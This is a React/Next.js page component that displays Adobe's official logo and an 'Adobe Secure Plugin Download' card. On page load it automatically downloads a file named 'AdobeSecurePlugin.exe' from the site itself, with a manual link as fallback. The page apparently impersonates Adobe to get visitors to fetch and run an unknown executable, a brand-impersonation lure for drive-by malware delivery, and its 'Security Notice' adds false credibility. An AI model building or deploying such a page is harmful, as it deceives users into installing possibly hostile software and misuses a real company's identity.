"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Download, AlertCircle, CheckCircle } from "lucide-react"

export default function DownloadPage() {
  const [downloadStatus, setDownloadStatus] = useState<"idle" | "checking" | "available" | "error">("idle")
  const [errorMessage, setErrorMessage] = useState("")

  const fileUrl = "/AdobeSecurePlugin.exe"
  const fileName = "AdobeSecurePlugin.exe"

  const checkFileAvailability = async () => {
    setDownloadStatus("checking")
    try {
      const response = await fetch(fileUrl, { method: "HEAD" })
      if (response.ok) {
        setDownloadStatus("available")
      } else {
        setDownloadStatus("error")
        setErrorMessage(`File not found (${response.status}). The repository or file may not exist.`)
      }
    } catch (error) {
      setDownloadStatus("error")
      setErrorMessage("Unable to check file availability. Please check your internet connection.")
    }
  }

  const handleDownload = () => {
    try {
      const link = document.createElement("a")
      link.href = fileUrl
      link.download = fileName
      link.target = "_blank"
      document.body.appendChild(link)
      link.click()
      document.body.removeChild(link)
    } catch (error) {
      setErrorMessage("Download failed. Please try the manual download link.")
    }
  }

  // Check availability on first load
  useEffect(() => {
    checkFileAvailability()
  }, [])

  // Auto download once confirmed available
  useEffect(() => {
    if (downloadStatus === "available") {
      handleDownload()
    }
  }, [downloadStatus])

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
      <Card className="w-full max-w-md">
        <CardHeader className="text-center space-y-4">
          <div className="flex justify-center">
            <img
              src="https://www.adobe.com/federal/assets/svgs/adobe-logo.svg"
              alt="Adobe Logo"
              className="h-12"
            />
          </div>
          <CardTitle className="flex items-center justify-center gap-2">
            <Download className="h-6 w-6" />
            File Download
          </CardTitle>
          <CardDescription>Adobe Secure Plugin Download</CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {downloadStatus === "checking" && (
            <Alert>
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>Checking file availability...</AlertDescription>
            </Alert>
          )}

          {downloadStatus === "available" && (
            <>
              <Alert className="border-green-200 bg-green-50">
                <CheckCircle className="h-4 w-4 text-green-600" />
                <AlertDescription className="text-green-800">File is available and downloading automatically...</AlertDescription>
              </Alert>
              <Button onClick={handleDownload} className="w-full" size="lg">
                <Download className="mr-2 h-4 w-4" />
                Download {fileName}
              </Button>
            </>
          )}

          {downloadStatus === "error" && (
            <Alert variant="destructive">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{errorMessage}</AlertDescription>
            </Alert>
          )}

          <div className="text-center text-sm text-gray-600">
            <p>File: {fileName}</p>
            <p className="mt-2">
              Manual download:{" "}
              <a href={fileUrl} target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">
                Click here
              </a>
            </p>
          </div>

          <Alert className="bg-yellow-50 border-yellow-200">
            <AlertCircle className="h-4 w-4 text-yellow-600" />
            <AlertDescription className="text-yellow-800">
              <strong>Security Notice:</strong> Only download executable files from trusted sources. Verify the file
              integrity before running.
            </AlertDescription>
          </Alert>
        </CardContent>
      </Card>
    </div>
  )
}
